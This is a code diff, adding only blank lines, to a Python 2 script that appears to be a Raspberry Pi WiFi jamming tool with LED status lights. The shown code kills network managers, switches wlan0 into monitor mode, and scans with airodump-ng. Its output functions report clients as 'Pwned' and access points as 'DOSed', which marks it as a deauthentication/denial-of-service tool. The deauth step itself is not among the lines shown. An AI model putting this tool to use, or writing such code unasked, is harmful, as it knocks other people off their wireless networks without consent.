@@ -18,6 +18,7 @@ if gpio == '1':
     GPIO.setup(r, GPIO.OUT)
     GPIO.setup(g, GPIO.OUT)
     GPIO.setup(b, GPIO.OUT)
+
 def blink(re, gr, bl, d):
 	if gpio == '1':
 	    GPIO.output(r, not(re))
@@ -27,12 +28,14 @@ def blink(re, gr, bl, d):
 	    GPIO.output(r, True)
 	    GPIO.output(g, True)
 	    GPIO.output(b, True)
+	
 blink(True, False, False, 0.4)
 blink(False, True, False, 0.4)
 blink(False, False, True, 0.4)
 os.system("sudo airmon-ng check kill")
 os.system("sudo ifconfig wlan0 down")
 os.system("sudo iwconfig wlan0 mode monitor")
+
 def scan(channel, duration):
 	execute = []
 	execute.append("airodump-ng")
@@ -49,14 +52,17 @@ def scan(channel, duration):
 		time.sleep(0.9)
 	subprocess.call(["kill", "-9", "%d" % proc.pid])
 	proc.wait()
+	
 def outclient(out):
 	print "Pwned " + out
 	blink(True, False, False, 0.25)
 	time.sleep(0.4)
+	
 def outAP(out):
 	print "DOSed " + out
 	blink(True, True, True, 0.25)
 	time.sleep(0.4)
+	
 def analyse(clientmacs, apmacs, chann, bssids):
 	if gpio == '1':
 	    GPIO.output(g, False)
@@ -78,6 +84,7 @@ def analyse(clientmacs, apmacs, chann, bssids):
 				pass
 	if gpio == '1':
 	    GPIO.output(g, True)
+	
 while 2 == 2:
 	scan(0, 18)
 	clientmacs = []
